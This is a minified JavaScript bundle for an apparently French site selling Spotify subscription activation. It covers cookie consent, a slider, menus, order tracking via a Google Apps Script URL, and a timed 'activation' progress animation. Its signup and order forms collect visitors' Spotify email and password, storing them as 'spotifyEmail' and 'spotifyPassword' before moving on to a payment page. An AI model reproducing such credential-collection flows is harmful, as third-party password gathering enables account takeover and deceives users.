"use strict";(()=>{function d(){let e=document.getElementById("cookie-consent"),t=document.getElementById("accept-cookies"),n=document.getElementById("reject-cookies");!e||!t||!n||(localStorage.getItem("cookieConsent")||(e.style.display="block"),t.addEventListener("click",()=>{localStorage.setItem("cookieConsent","accepted"),e.style.display="none"}),n.addEventListener("click",()=>{localStorage.setItem("cookieConsent","rejected"),e.style.display="none"}))}function m(){let e=document.querySelector(".feature-slider");if(!e)return;let t=e.querySelector(".feature-slide-track"),n=!1,o,s,r=i=>{n=!0,e.classList.add("dragging"),o=i-e.offsetLeft,s=e.scrollLeft},c=()=>{n=!1,e.classList.remove("dragging")},a=i=>{if(!n)return;let l=i-e.offsetLeft-o;e.scrollLeft=s-l};e.addEventListener("mousedown",i=>r(i.pageX)),e.addEventListener("touchstart",i=>r(i.touches[0].pageX),{passive:!0}),window.addEventListener("mouseup",c),e.addEventListener("touchend",c),e.addEventListener("mousemove",i=>a(i.pageX)),e.addEventListener("touchmove",i=>a(i.touches[0].pageX),{passive:!0})}function y(){let e=document.getElementById("signup-form");e&&e.addEventListener("submit",t=>{t.preventDefault();let n=document.getElementById("hero-email").value.trim(),o=document.getElementById("hero-password").value.trim();!n||!o||(sessionStorage.setItem("spotifyEmail",n),sessionStorage.setItem("spotifyPassword",o),window.location.href="paiement.html")})}function k(){let e=document.getElementById("order-form");if(!e)return;let t=document.getElementById("order-btn"),n=e.querySelectorAll('.consent-checks input[type="checkbox"]'),o=document.getElementById("cmd-email"),s=document.getElementById("cmd-password"),r=()=>{if(!t||!o||!s)return;let c=Array.from(n).every(l=>l.checked),a=o.checkValidity()&&o.value.trim()!=="",i=s.value.trim()!=="";t.disabled=!(c&&a&&i)};e.addEventListener("input",r),e.addEventListener("change",r),r()}function u(){y(),k()}function E(){let e=document.querySelector(".mobile-menu-btn"),t=document.querySelector(".nav");e&&t&&e.addEventListener("click",()=>{t.classList.toggle("active"),e.classList.toggle("active")})}function L(){document.querySelectorAll(".faq-item").forEach(e=>{e.querySelector("h4").addEventListener("click",()=>e.classList.toggle("open"))})}function g(){let e=document.querySelector("header"),t=document.getElementById("back-to-top"),n=document.getElementById("theme-toggle");if(e){let o=()=>{window.scrollY>80?e.classList.add("header--scrolled"):e.classList.remove("header--scrolled")};window.addEventListener("scroll",o,{passive:!0}),o()}E(),L()}var I="https://script.google.com/macros/s/AKfycbxEmJdgcerK1ENvsy8IvSnAZDJ6p4fr9hfO87haKbKrVXZaRf2Z3wnRzyQSDl527VtW/exec";function f(e){let t=document.getElementById("progress-bar-fill"),n=document.querySelectorAll(".step");if(!t||!n.length)return;let o=0;e===1?o=0:e===2?o=20:e===3?o=40:e===4?o=60:e===5&&(o=100),t.style.width=o+"%",n.forEach((s,r)=>{let c=r+1;s.classList.remove("active","completed"),c<e?s.classList.add("completed"):c===e&&s.classList.add("active")})}async function w(e){let t=document.getElementById("loading-overlay");t&&(t.style.display="flex");try{let n=await fetch(`${I}?orderID=${e}`);if(!n.ok)throw new Error("Network response was not ok.");let o=await n.json();return o.error?null:o}catch(n){return console.error("Failed to fetch tracking data:",n),null}finally{t&&(t.style.display="none")}}function S(e,t){if(t.innerHTML="",t.classList.remove("hidden"),!e){t.innerHTML='<p class="error-message">Commande non trouv\xE9e. Veuillez v\xE9rifier le num\xE9ro et r\xE9essayer.</p>';return}let o={pending:{text:"En attente",step:1},processing:{text:"En traitement",step:2},completed:{text:"Termin\xE9e",step:3}}[e.status]||{text:"Inconnu",step:0},s=`
        <div class="tracking-header">
            <div class="tracking-info">
                <h3>Commande #${e.orderID}</h3>
                <p class="tracking-date">Date: ${new Date(e.date).toLocaleDateString()}</p>
            </div>
            <div class="tracking-status">
                <span class="status-badge status-${e.status}">${o.text}</span>
            </div>
        </div>
        <div class="tracking-timeline">
            <div class="timeline-item ${o.step>=1?"completed":""}">
                <div class="timeline-icon">\u{1F4DD}</div>
                <div class="timeline-content"><h4>Commande Re\xE7ue</h4><p>Votre commande a \xE9t\xE9 enregistr\xE9e.</p></div>
            </div>
            <div class="timeline-item ${o.step>=2?"completed":""}">
                <div class="timeline-icon">\u2699\uFE0F</div>
                <div class="timeline-content"><h4>En Traitement</h4><p>Nous pr\xE9parons l'activation de votre compte.</p></div>
            </div>
            <div class="timeline-item ${o.step>=3?"completed":""}">
                <div class="timeline-icon">\u2705</div>
                <div class="timeline-content"><h4>Activation Termin\xE9e</h4><p>Votre abonnement est actif. Un email de confirmation a \xE9t\xE9 envoy\xE9.</p></div>
            </div>
        </div>
        ${e.notes?`<div class="tracking-notes"><h4>Notes:</h4><p>${e.notes}</p></div>`:""}
    `;t.innerHTML=s}function b(){let e=document.getElementById("track-order-btn"),t=document.getElementById("order-number"),n=document.querySelector(".tracking-result");if(e&&t&&n){let o=async()=>{let s=t.value.trim();if(!s){alert("Veuillez entrer un num\xE9ro de commande.");return}let r=await w(s);S(r,n)};e.addEventListener("click",o),t.addEventListener("keypress",s=>{s.key==="Enter"&&o()})}}function B(){if(!document.getElementById("activation-progress"))return;let t=1;f(t);let n=setInterval(()=>{if(t++,t>5){clearInterval(n);return}f(t)},2e3)}function v(){document.getElementById("activation-progress")&&B(),document.querySelector(".tracking-search")&&b()}function p(){let e=document.querySelectorAll("[data-reveal]");if(e.length===0)return;let t=new IntersectionObserver((n,o)=>{n.forEach(s=>{if(s.isIntersecting){let r=s.target.dataset.revealDelay||"0s";s.target.style.transitionDelay=r,s.target.classList.add("revealed"),o.unobserve(s.target)}})},{root:null,rootMargin:"0px",threshold:.1});e.forEach(n=>{let o=parseFloat(n.dataset.revealThreshold)||.1;t.observe(n)})}function h(){let e=document.querySelector(".hero__visual");if(!e)return;let t=()=>{let n=window.scrollY;e.style.transform=`translateY(${n*.1}px)`};window.addEventListener("scroll",()=>{window.requestAnimationFrame(t)},{passive:!0})}document.addEventListener("DOMContentLoaded",()=>{d(),m(),u(),g(),v(),p(),h()});})();
